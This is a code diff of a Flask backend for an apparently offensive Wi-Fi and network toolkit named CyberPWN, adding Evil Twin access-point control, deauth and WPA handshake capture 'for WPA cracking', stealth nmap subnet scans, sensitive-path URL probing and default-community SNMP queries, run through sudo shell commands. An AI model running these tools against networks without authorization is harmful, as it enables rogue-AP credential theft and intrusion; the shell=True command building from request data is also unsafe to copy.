-        stdout_str = str(run_result.get("stdout", ""))
+        result = run_capture(cmd, timeout=8)
+        
+        stdout_str = result.get('stdout', '')
         hint = None
-        if "unavailable" in stdout_str.lower() or "INTERFACE_UNAVAILABLE" in stdout_str or "STOP_AP" in stdout_str:
-            hint = "wlan0 was taken by NetworkManager/wpa_supplicant. To run AP: release the interface first (e.g. nmcli dev set wlan0 managed no, or use a second WiFi interface for AP)."
-
-        payload = {
-            "ok": run_result.get("returncode", -1) == 0 or run_result.get("timeout"),
-            "msg": f"Evil Twin target: {ssid}",
-            "cmd": str(run_result.get("cmd", cmd)),
+        if "unavailable" in stdout_str.lower() or "INTERFACE_UNAVAILABLE" in stdout_str:
+            hint = "Interface unavailable. Release wlan0 first: nmcli dev set wlan0 managed no"
+        
+        return jsonify({
+            "ok": result.get('returncode') == 0 or result.get('timeout'),
+            "msg": f"Evil Twin AP: {ssid}",
             "stdout": stdout_str,
-            "stderr": str(run_result.get("stderr", "")),
-            "returncode": int(run_result.get("returncode", -1)),
-            "timeout": bool(run_result.get("timeout", False)),
-            "debug": debug,
-        }
-        if hint:
-            payload["hint"] = hint
-        return jsonify(payload)
+            "stderr": result.get('stderr', ''),
+            "returncode": result.get('returncode', -1),
+            "hint": hint
+        })
     except Exception as e:
-        return jsonify({"error": str(e), "debug": {"exception": str(e)}})
+        return jsonify({"error": str(e)})
 
-# --- Evil Twin: start full AP (script) — reachable at http://192.168.4.1:5000 when AP is up ---
 AP_SCRIPT_START = "scripts/start_evil_twin_ap.sh"
 AP_SCRIPT_STOP = "scripts/stop_ap.sh"
 AP_IP = "192.168.4.1"
 
 @app.route('/api/evil_twin_start', methods=['POST'])
 def evil_twin_start():
-    """Run start_evil_twin_ap.sh with SSID; AP comes up at 192.168.4.1, UI at http://192.168.4.1:5000."""
     try:
         data = request.get_json(force=True, silent=True) or {}
         ssid = (data.get("ssid") or "").strip()[:32]
+        
         if not ssid or not re.match(r"^[ -~]+$", ssid):
             return jsonify({"error": "Valid SSID required"})
+        
         script = os.path.join(base_dir, AP_SCRIPT_START)
         if not os.path.isfile(script):
             return jsonify({"error": f"Script not found: {script}"})
-        cmd = f"sudo bash '{script}' '{ssid}' 2>&1"
-        run_result = run_capture(cmd, timeout=25)
+        
+        result = run_capture(f"sudo bash '{script}' '{ssid}' 2>&1", timeout=25)
         return jsonify({
-            "ok": run_result.get("returncode") == 0,
-            "msg": f"AP start: {ssid}",
+            "ok": result.get("returncode") == 0,
+            "msg": f"AP started: {ssid}",
             "url": f"http://{AP_IP}:5000",
-            "cmd": str(run_result.get("cmd", cmd)),
-            "stdout": str(run_result.get("stdout", "")),
-            "stderr": str(run_result.get("stderr", "")),
-            "returncode": int(run_result.get("returncode", -1)),
+            "stdout": result.get("stdout", ""),
+            "stderr": result.get("stderr", ""),
+            "returncode": result.get("returncode", -1)
         })
     except Exception as e:
         return jsonify({"error": str(e)})
 
 @app.route('/api/evil_twin_stop', methods=['POST'])
 def evil_twin_stop():
-    """Run stop_ap.sh; wlan0 returns to NetworkManager."""
     try:
         script = os.path.join(base_dir, AP_SCRIPT_STOP)
         if not os.path.isfile(script):
             return jsonify({"error": f"Script not found: {script}"})
-        cmd = f"sudo bash '{script}' 2>&1"
-        run_result = run_capture(cmd, timeout=15)
+        
+        result = run_capture(f"sudo bash '{script}' 2>&1", timeout=15)
         return jsonify({
-            "ok": run_result.get("returncode") == 0,
+            "ok": result.get("returncode") == 0,
             "msg": "AP stopped",
-            "cmd": str(run_result.get("cmd", cmd)),
-            "stdout": str(run_result.get("stdout", "")),
-            "stderr": str(run_result.get("stderr", "")),
-            "returncode": int(run_result.get("returncode", -1)),
+            "stdout": result.get("stdout", ""),
+            "stderr": result.get("stderr", ""),
+            "returncode": result.get("returncode", -1)
         })
     except Exception as e:
         return jsonify({"error": str(e)})
 
-# --- URL discovery (hidden paths) ---
+# --- Packet Sniffing (using tcpdump/tshark) ---
+def beacon_sniff():
+    """Capture and parse WiFi beacon frames to extract SSIDs."""
+    try:
+        # Use airodump-ng for better beacon capture
+        mon_iface = get_monitor_interface()
+        if not mon_iface:
+            return {'ok': False, 'error': 'No monitor interface available'}
+        
+        # Capture beacons using airodump-ng (more reliable than tcpdump)
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.csv', delete=False) as tmp:
+            csv_file = tmp.name
+        
+        cmd = f"sudo timeout 5 airodump-ng --write /tmp/beacon_cap --output-format csv {mon_iface} 2>&1 | head -20"
+        result = run_capture(cmd, timeout=8)
+        
+        # Try to parse CSV output
+        ssids = []
+        if os.path.exists('/tmp/beacon_cap-01.csv'):
+            try:
+                with open('/tmp/beacon_cap-01.csv', 'r') as f:
+                    for line in f:
+                        if 'Station MAC' in line:
+                            break
+                        parts = line.split(',')
+                        if len(parts) > 13 and parts[13].strip():
+                            ssid = parts[13].strip()
+                            if ssid and ssid not in ssids:
+                                ssids.append(ssid)
+            except:
+                pass
+        
+        # Fallback to tcpdump if airodump failed
+        if not ssids:
+            cmd = f"sudo tcpdump -i {mon_iface} -n -c 20 type mgt subtype beacon 2>/dev/null | grep -o 'SSID: [^,]*' | cut -d' ' -f2"
+            result = run_capture(cmd, timeout=8)
+            ssids = [s.strip() for s in result.get('stdout', '').split('\n') if s.strip() and s.strip() != 'SSID:']
+        
+        return {'ok': True, 'ssids': list(set(ssids))[:20], 'count': len(ssids)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def deauth_sniff():
+    """Capture deauthentication frames."""
+    try:
+        mon_iface = get_monitor_interface()
+        if not mon_iface:
+            return {'ok': False, 'error': 'No monitor interface available'}
+        
+        cmd = f"sudo tcpdump -i {mon_iface} -n -c 20 type mgt subtype deauth 2>/dev/null"
+        result = run_capture(cmd, timeout=8)
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
+        return {'ok': True, 'deauth_packets': lines[:10], 'count': len(lines)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def packet_count():
+    """Count packets on wireless interface."""
+    try:
+        mon_iface = get_monitor_interface() or 'wlan0'
+        cmd = f"sudo tcpdump -i {mon_iface} -n -c 20 2>/dev/null"
+        result = run_capture(cmd, timeout=8)
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
+        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def eapol_pmkid_scan():
+    """Capture EAPOL/PMKID handshakes for WPA cracking."""
+    try:
+        mon_iface = get_monitor_interface()
+        if not mon_iface:
+            return {'ok': False, 'error': 'No monitor interface available'}
+        
+        # Capture EAPOL frames (WPA handshake)
+        cmd = f"sudo tcpdump -i {mon_iface} -n -c 20 ether proto 0x888e 2>/dev/null"
+        result = run_capture(cmd, timeout=8)
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
+        return {'ok': True, 'eapol_packets': lines[:10], 'count': len(lines)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def packet_monitor():
+    """Monitor all packets on wireless interface."""
+    try:
+        mon_iface = get_monitor_interface() or 'wlan0'
+        cmd = f"sudo tcpdump -i {mon_iface} -n -c 20 -vvv 2>/dev/null"
+        result = run_capture(cmd, timeout=8)
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
+        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def channel_analyzer():
+    """Analyze WiFi channels using iwlist."""
+    try:
+        result = run_capture("sudo iwlist wlan0 channel 2>/dev/null", timeout=5)
+        if result.get('returncode') != 0:
+            return {'ok': False, 'error': 'iwlist failed - interface may not support channel scanning'}
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip()]
+        return {'ok': True, 'channels': lines}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def raw_capture():
+    """Capture raw packets to file."""
+    try:
+        mon_iface = get_monitor_interface() or 'wlan0'
+        capture_file = '/tmp/cyberpwn_capture.pcap'
+        cmd = f"sudo tcpdump -i {mon_iface} -c 20 -w {capture_file} 2>/dev/null"
+        result = run_capture(cmd, timeout=8)
+        if result.get('returncode') == 0 and os.path.exists(capture_file):
+            return {'ok': True, 'output': f'Raw packets saved to {capture_file}', 'file': capture_file}
+        else:
+            return {'ok': False, 'error': 'Capture failed or file not created'}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def detect_pwnagotchi():
+    """Detect Pwnagotchi devices using nmap."""
+    try:
+        result = run_capture("sudo nmap --script broadcast-wifi-discover 2>/dev/null", timeout=10)
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip() and 'pwnagotchi' in l.lower()]
+        return {'ok': True, 'wifi_devices': lines[:10], 'count': len(lines)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+def detect_pineapple():
+    """Detect WiFi Pineapple devices using nmap."""
+    try:
+        result = run_capture("sudo nmap --script broadcast-wifi-discover 2>/dev/null", timeout=10)
+        lines = [l.strip() for l in result.get('stdout', '').splitlines() if l.strip() and ('pineapple' in l.lower() or 'wifipineapple' in l.lower())]
+        return {'ok': True, 'wifi_devices': lines[:10], 'count': len(lines)}
+    except Exception as e:
+        return {'ok': False, 'error': str(e)}
+
+# --- Sniffer API Routes ---
+@app.route('/api/sniffer/beacon', methods=['POST'])
+def sniffer_beacon():
+    return jsonify(beacon_sniff())
+
+@app.route('/api/sniffer/deauth', methods=['POST'])
+def sniffer_deauth():
+    return jsonify(deauth_sniff())
+
+@app.route('/api/sniffer/packet_count', methods=['POST'])
+def sniffer_packet_count():
+    return jsonify(packet_count())
+
+@app.route('/api/sniffer/eapol_pmkid', methods=['POST'])
+def sniffer_eapol_pmkid():
+    return jsonify(eapol_pmkid_scan())
+
+@app.route('/api/sniffer/packet_monitor', methods=['POST'])
+def sniffer_packet_monitor():
+    return jsonify(packet_monitor())
+
+@app.route('/api/sniffer/channel_analyzer', methods=['POST'])
+def sniffer_channel_analyzer():
+    return jsonify(channel_analyzer())
+
+@app.route('/api/sniffer/raw_capture', methods=['POST'])
+def sniffer_raw_capture():
+    return jsonify(raw_capture())
+
+@app.route('/api/sniffer/detect_pwnagotchi', methods=['POST'])
+def sniffer_detect_pwnagotchi():
+    return jsonify(detect_pwnagotchi())
+
+@app.route('/api/sniffer/detect_pineapple', methods=['POST'])
+def sniffer_detect_pineapple():
+    return jsonify(detect_pineapple())
+
+# --- Security Scanning ---
 URL_WORDLIST = [
     "/", "/admin", "/login", "/admin.html", "/login.html", "/backup", "/backup.zip",
     "/.git/config", "/.env", "/config", "/api", "/api/", "/debug", "/phpinfo.php",
@@ -437,243 +958,136 @@ def url_scan():
     try:
         data = request.get_json(force=True, silent=True) or {}
         base = (data.get("base_url") or "").strip().rstrip("/")
+        
         if not base:
             return jsonify({"error": "base_url required"})
         if not re.match(r"^https?://[a-zA-Z0-9.\-]+(:\d+)?$", base):
-            return jsonify({"error": "Invalid base_url (use http(s)://host or host:port)"})
+            return jsonify({"error": "Invalid base_url format"})
+        
         import urllib.request
         import ssl
+        
         found = []
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
+        
         for path in URL_WORDLIST:
             try:
                 url = base + path
-                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "CyberPWN/1"})
+                req = urllib.request.Request(url, method="GET", headers={"User-Agent": "CyberPWN/1.0"})
                 with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
-                    found.append({"url": url, "status": r.getcode()})
+                    found.append({"url": url, "status": r.getcode(), "found": True})
             except urllib.error.HTTPError as e:
-                found.append({"url": url, "status": e.code})
+                found.append({"url": url, "status": e.code, "found": e.code < 500})
             except Exception:
-                pass
-        return jsonify({"base": base, "found": found})
+                found.append({"url": url, "status": 0, "found": False})
+        
+        return jsonify({"base": base, "found": found, "total": len(found), "accessible": sum(1 for f in found if f.get('found'))})
     except Exception as e:
         return jsonify({"error": str(e)})
 
-# --- Cisco VLAN discovery (SNMP) ---
 @app.route('/api/cisco_vlans')
 def cisco_vlans():
     try:
-        target = request.args.get("target", "").strip() or None
+        target = request.args.get("target", "").strip()
+        
         if not target:
-            try:
-                ip_raw = subprocess.check_output("hostname -I", shell=True, timeout=2).decode('utf-8').strip()
-                target = ip_raw.split()[0] if ip_raw else None
-                if target:
-                    target = ".".join(target.split(".")[:3] + ["1"])
-            except Exception:
-                pass
+            # Auto-detect gateway
+            result = run_capture("hostname -I", timeout=2)
+            if result.get('returncode') == 0:
+                ip_raw = result.get('stdout', '').strip()
+                if ip_raw:
+                    my_ip = ip_raw.split()[0]
+                    target = ".".join(my_ip.split(".")[:3] + ["1"])
+        
         if not target or not re.match(r"^[0-9.]+$", target):
-            return jsonify(["ERROR: No target. Use ?target=192.168.1.1 or ensure network."])
-        cmd = f"snmpwalk -v2c -c public {target} 1.3.6.1.4.1.9.9.46.1.3.1.1.2 2>/dev/null || echo 'snmpwalk not found or no VLAN OID'"
-        out = run_capture(cmd, timeout=10)
-        lines = (out.get("stdout") or "").split("\n")[:30]
+            return jsonify(["ERROR: No target. Use ?target=192.168.1.1"])
+        
+        # Use snmpwalk to query Cisco VLAN OID
+        cmd = f"snmpwalk -v2c -c public {target} 1.3.6.1.4.1.9.9.46.1.3.1.1.2 2>/dev/null"
+        result = run_capture(cmd, timeout=10)
+        
+        lines = [l.strip() for l in result.get('stdout', '').split('\n') if l.strip()][:30]
+        
         if not any("1.3.6" in l for l in lines):
-            lines = ["SNMP VLAN OID not available.", "Install: apt install snmp", "Or use target= switch IP with SNMP enabled."] + lines
+            return jsonify([
+                "SNMP VLAN OID not available.",
+                "Install: apt install snmp",
+                "Or ensure target has SNMP enabled with community 'public'"
+            ])
+        
         return jsonify(lines)
     except Exception as e:
         return jsonify([f"ERROR: {str(e)}"])
 
-# --- Cisco audit (ports + known vuln hints) ---
-CISCO_HINTS = """
-Cisco common ports: 23 Telnet, 22 SSH, 161 SNMP, 443 HTTPS, 80 HTTP.
+CISCO_HINTS = """Cisco common ports: 23 Telnet, 22 SSH, 161 SNMP, 443 HTTPS, 80 HTTP.
 Known issues: default creds, CVE-2018-0171 (Smart Install), CVE-2019-12643 (IOS XE).
-Use only on authorized networks.
-""".strip()
+Use only on authorized networks."""
 
 @app.route('/api/cisco_audit')
 def cisco_audit():
     try:
-        my_ip_raw = subprocess.check_output("hostname -I", shell=True, timeout=2).decode('utf-8').strip()
-        if not my_ip_raw:
-            return jsonify(["ERROR: No network."])
-        my_ip = my_ip_raw.split()[0]
+        result = run_capture("hostname -I", timeout=2)
+        if result.get('returncode') != 0 or not result.get('stdout'):
+            return jsonify(["ERROR: No network detected"])
+        
+        my_ip = result.get('stdout', '').strip().split()[0]
         subnet = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
-        cmd = f"nmap -sT -p 23,22,161,443,80 --open -n {subnet} --exclude {my_ip} 2>&1 | head -80"
-        out = run_capture(cmd, timeout=60)
-        lines = (out.get("stdout") or "").split("\n")
-        result = [f"TARGET: {subnet}", CISCO_HINTS, ""] + [l for l in lines if l.strip()]
-        return jsonify(result[:50])
+        
+        # Scan for Cisco common ports
+        cmd = f"nmap -sT -p 23,22,161,443,80 --open -n {subnet} --exclude {my_ip} 2>&1"
+        result = run_capture(cmd, timeout=60)
+        
+        output = result.get('stdout', '')
+        parsed = parse_nmap_output(output)
+        
+        result_lines = [f"TARGET: {subnet}", CISCO_HINTS, ""]
+        for device in parsed:
+            result_lines.append(f"{device['ip']}:")
+            for port_info in device['ports']:
+                result_lines.append(f"  Port {port_info['port']}: {port_info['service']}")
+        
+        if not parsed:
+            result_lines.append("No Cisco devices found on common ports")
+        
+        return jsonify(result_lines[:50])
     except Exception as e:
         return jsonify([f"ERROR: {str(e)}"])
 
-# --- 2. VULNERABILITY MONITOR (High-Risk Ports) ---
 @app.route('/api/nmap', strict_slashes=False)
 def nmap_scan():
     try:
-        # 1. Get Local Subnet
-        # hostname -I usually returns "192.168.1.15 ..."
-        my_ip_raw = subprocess.check_output("hostname -I", shell=True).decode('utf-8').strip()
-        if not my_ip_raw: return jsonify(["ERROR: No Network"])
+        # Get local subnet
+        result = run_capture("hostname -I", timeout=3)
+        if result.get('returncode') != 0 or not result.get('stdout'):
+            return jsonify(["ERROR: No network detected"])
         
-        my_ip = my_ip_raw.split(' ')[0]
-        # Create subnet 192.168.1.0/24
+        my_ip = result.get('stdout', '').strip().split()[0]
         subnet = f"{'.'.join(my_ip.split('.')[:3])}.0/24"
         
-        print(f"[LOG] Scanning Danger Ports on {subnet}")
+        # Scan for high-risk ports (FTP, Telnet, SMB, RDP, HTTP-alt)
+        cmd = f"sudo nmap -sS -p 21,23,445,3389,8080 --open -n {subnet} --exclude {my_ip} 2>&1"
+        result = run_capture(cmd, timeout=60)
         
-        # 2. RUN STEALTH SCAN (-sS) ON DANGER PORTS
-        # 21=FTP, 23=Telnet, 445=SMB(Windows), 3389=RDP, 8080=AltWeb
-        # --open: Only show devices with these holes open
-        cmd = f"sudo nmap -sS -p 21,23,445,3389,8080 --open -n {subnet} --exclude {my_ip}"
+        if result.get('timeout'):
+            return jsonify(["TIMEOUT: Scan took too long"])
         
-        output = subprocess.check_output(cmd, shell=True).decode('utf-8')
+        output = result.get('stdout', '')
+        parsed = parse_nmap_output(output)
         
-        # 3. Clean Output
-        clean_res = []
-        clean_res.append(f"TARGET: {subnet}")
+        results = [f"TARGET: {subnet}"]
         
-        current_ip = ""
-        found_vuln = False
+        if parsed:
+            for device in parsed:
+                for port_info in device['ports']:
+                    results.append(f"{device['ip']} > {port_info['port']} ({port_info['service']})")
+        else:
+            results.append("SECURE: No vulnerable ports found")
         
-        for line in output.split('\n'):
-            # Detect IP Line
-            if "scan report" in line:
-                current_ip = line.split("for ")[1]
-            
-            # Detect Open Port Line
-            if "open" in line and "tcp" in line:
-                found_vuln = True
-                # Line example: "445/tcp open  microsoft-ds"
-                parts = line.split() # Splits by any whitespace
-                port = parts[0].split('/')[0] # Get 445
-                service = parts[-1] # Get service name (last item)
-                
-                clean_res.append(f"{current_ip} > {port} ({service})")
-
-        if not found_vuln:
-            clean_res.append("SECURE: No vulnerable ports found.")
-            
-        return jsonify(clean_res)
-
+        return jsonify(results)
     except Exception as e:
         return jsonify([f"FAIL: {str(e)}"])
 
-# --- SNIFFER BACKEND LOGIC (CB1 SYSTEM TOOLS) ---
-import tempfile
-
-def beacon_sniff():
-    try:
-        with tempfile.NamedTemporaryFile(delete=False) as tmp:
-            cmd = "sudo tcpdump -i wlan0 type mgt subtype beacon -c 20 -vvv -w {}".format(tmp.name)
-            result = run_capture(cmd, timeout=8)
-            parse_cmd = f"tshark -r {tmp.name} -Y 'wlan.ssid' -T fields -e wlan.ssid"
-            ssids = run_capture(parse_cmd, timeout=5)
-            ssid_list = [s for s in ssids.get('stdout', '').splitlines() if s]
-            return {'ok': True, 'ssids': ssid_list, 'count': len(ssid_list)}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def deauth_sniff():
-    try:
-        cmd = "sudo tcpdump -i wlan0 type mgt subtype deauth -c 20 -vvv"
-        result = run_capture(cmd, timeout=8)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'deauth_packets': lines[:10], 'count': len(lines)}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def packet_count():
-    try:
-        cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
-        result = run_capture(cmd, timeout=8)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def eapol_pmkid_scan():
-    try:
-        cmd = "sudo tcpdump -i wlan0 ether proto 0x888e -c 20 -vvv"
-        result = run_capture(cmd, timeout=8)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'eapol_packets': lines[:10], 'count': len(lines)}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def packet_monitor():
-    try:
-        cmd = "sudo tcpdump -i wlan0 -c 20 -vvv"
-        result = run_capture(cmd, timeout=8)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'packets': lines[:10], 'count': len(lines)}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def channel_analyzer():
-    try:
-        cmd = "sudo iwlist wlan0 channel"
-        result = run_capture(cmd, timeout=5)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'channels': lines}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def raw_capture():
-    try:
-        with tempfile.NamedTemporaryFile(delete=False) as tmp:
-            cmd = "sudo tcpdump -i wlan0 -c 20 -w {}".format(tmp.name)
-            result = run_capture(cmd, timeout=8)
-            return {'ok': True, 'output': 'Raw packets saved to file.'}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def detect_pwnagotchi():
-    try:
-        cmd = "sudo nmap --script broadcast-wifi-discover"
-        result = run_capture(cmd, timeout=10)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'wifi_devices': lines[:10]}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-
-def detect_pineapple():
-    try:
-        cmd = "sudo nmap --script broadcast-wifi-discover"
-        result = run_capture(cmd, timeout=10)
-        lines = [l for l in result.get('stdout', '').splitlines() if l]
-        return {'ok': True, 'wifi_devices': lines[:10]}
-    except Exception as e:
-        return {'ok': False, 'error': str(e)}
-# --- Helper: run_capture (replaces _run_capture) ---
-def run_capture(cmd, timeout=10):
-    try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
-        return {
-            'cmd': cmd,
-            'stdout': result.stdout.decode('utf-8', errors='replace'),
-            'stderr': result.stderr.decode('utf-8', errors='replace'),
-            'returncode': result.returncode,
-            'timeout': False
-        }
-    except subprocess.TimeoutExpired as e:
-        return {
-            'cmd': cmd,
-            'stdout': '',
-            'stderr': f'Timeout: {str(e)}',
-            'returncode': -1,
-            'timeout': True
-        }
-
-@app.route('/api/sniffer/detect_pwnagotchi', methods=['POST'])
-def sniffer_detect_pwnagotchi():
-    return jsonify(detect_pwnagotchi())
-
-@app.route('/api/sniffer/detect_pineapple', methods=['POST'])
-def sniffer_detect_pineapple():
-    return jsonify(detect_pineapple())
-
 if __name__ == '__main__':
-    # Listen on all interfaces
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=False)
